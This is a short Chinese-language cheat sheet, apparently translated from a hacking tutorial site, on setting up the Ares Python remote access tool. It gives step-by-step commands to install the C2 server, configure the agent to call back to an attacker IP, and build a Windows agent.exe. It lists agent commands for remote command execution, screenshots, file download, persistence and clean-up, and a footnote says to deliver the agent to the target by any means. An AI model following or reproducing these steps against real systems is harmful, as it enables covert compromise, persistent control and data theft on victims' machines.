## C2 : Ares

### Introduction [^1]

### Installation

```bash
git clone https://github.com/sweetsoftware/Ares.git
cd Ares
pip install -r requirements.txt
./wine_setup.sh
```

### Exploiting Target

```bash
cd agent/
nano config.py
# SERVER 变量有一个IP地址，将其更改为入侵者计算机的内部IP地址
```

`./builder.py -p Windows –server http://192.168.1.4:8080 -o agent.exe` [^2]

```bash
# 启动服务器和数据库
cd server/
./ares.py initdb
./ares.py runserver -h 0.0.0.0 -p 8080 --threaded
# 浏览器访问 http://0.0.0.0:8080
```

### Command Execution

`systeminfo`

### Capturing Screenshot

`screenshot`

### File Download

`download file.txt`

### Compressing Files

`zip compressed.zip sample`

### Persistence Agent

`persist`

### Clean Up

`clean`



[原文](https://www.hackingarticles.in/command-control-ares/)

---

[^1]: 此工具通过Web界面执行命令和控制，是一个Python远程访问工具。Ares由两个主程序组成：一个是命令和控制服务器，它是一个管理代理的Web界面；另一个是代理程序，它在受感染的主机上运行，确保之间的通信
[^2]: 创建一个Windows代理，并且通过任何方式将此代理发送到目标计算机